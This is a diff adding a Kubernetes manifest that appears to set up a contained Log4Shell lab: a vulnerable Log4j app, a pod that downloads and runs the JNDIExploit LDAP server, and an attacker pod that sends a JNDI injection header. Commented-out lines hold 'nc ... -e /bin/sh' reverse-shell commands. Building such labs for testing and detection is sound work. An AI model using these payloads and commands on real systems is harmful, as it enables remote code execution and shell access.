@@ -1,0 +1,155 @@
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: vulnerable-log4j
+  name: vulnerable-log4j
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: vulnerable-log4j
+  strategy: {}
+  template:
+    metadata:
+      labels:
+        app: vulnerable-log4j
+    spec:
+      containers:
+      - name: vulnerable-log4j
+        image: ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
+        imagePullPolicy: IfNotPresent
+        ports:
+        - containerPort: 8080
+        resources:
+          limits:
+            memory: "800Mi"
+            cpu: "550m"
+          requests:
+            memory: "500Mi"
+            cpu: "500m"
+        securityContext:
+          privileged: true
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  labels:
+    app: vulnerable-ldap
+  name: vulnerable-ldap
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: vulnerable-ldap
+  strategy: {}
+  template:
+    metadata:
+      labels:
+        app: vulnerable-ldap
+    spec:
+      containers:
+      - name: vulnerable-ldap
+        # image: openjdk:8
+        image: nicolaka/netshoot
+        imagePullPolicy: IfNotPresent
+        command: ["/bin/bash"]
+        args: ["-c", "curl -LJ \"http://web.archive.org/web/20211211031401/https://objects.githubusercontent.com/github-production-release-asset-2e65be/314785055/a6f05000-9563-11eb-9a61-aa85eca37c76?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20211211%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20211211T031401Z&X-Amz-Expires=300&X-Amz-Signature=140e57e1827c6f42275aa5cb706fdff6dc6a02f69ef41e73769ea749db582ce0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=314785055&response-content-disposition=attachment%3B%20filename%3DJNDIExploit.v1.2.zip&response-content-type=application%2Foctet-stream\" -o JNDIExploit.v1.2.zip; unzip JNDIExploit.v1.2.zip; java -jar JNDIExploit-1.2-SNAPSHOT.jar -i attacker-log4j -p 8083"]
+        # args: ["-c", "curl -LJ \"https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\" -o JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar; java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C ' nc attacker-log4j 8083 -e /bin/sh' -A attacker-log4j"]
+        # args: ["-c", "curl -LJ \"https://web.archive.org/github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar\" -o JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar; java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'nc attacker-log4j 8083 -e /bin/sh' -A attacker-log4j"]
+        ports:
+        - containerPort: 8083
+        - containerPort: 1389
+        resources:
+          limits:
+            memory: "800Mi"
+            cpu: "550m"
+          requests:
+            memory: "500Mi"
+            cpu: "500m"
+        securityContext:
+          privileged: true
+---
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: vulnerable-log4j
+  name: vulnerable-log4j
+spec:
+  ports:
+  - port: 8080
+    protocol: TCP
+    targetPort: 8080
+  selector:
+    app: vulnerable-log4j
+---
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: vulnerable-ldap
+  name: vulnerable-ldap
+spec:
+  ports:
+  - port: 8083
+    protocol: TCP
+    targetPort: 8083
+  selector:
+    app: vulnerable-ldap
+---
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: ldap-server
+  name: ldap-server
+spec:
+  ports:
+  - port: 1389
+    protocol: TCP
+    targetPort: 1389
+  selector:
+    app: vulnerable-ldap
+---
+apiVersion: v1
+kind: Service
+metadata:
+  labels:
+    app: attacker-log4j
+  name: attacker-log4j
+spec:
+  ports:
+  - port: 8083
+    protocol: TCP
+    targetPort: 8083
+  selector:
+    app: attacker-log4j
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker-log4j
+  labels:
+    app: attacker-log4j
+spec:
+  containers:
+  - name: attacker-log4j
+    image: nicolaka/netshoot
+    imagePullPolicy: IfNotPresent
+    command: ["/bin/sh"]
+    args: ["-c", "nc -lvp 8083 & curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://ldap-server:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'"]
+    # args: ["-c", "nc -lvp 8083 & curl vulnerable-log4j:8080 -H 'X-Api-Version: ${jndi:ldap://ldap-server:1389/a}'"]
+    ports:
+    - containerPort: 8083
+    resources:
+      limits:
+        memory: "100Mi"
+        cpu: "100m"
+      requests:
+        memory: "64Mi"
+        cpu: "50m"
+    securityContext:
+      privileged: true
+  restartPolicy: Always
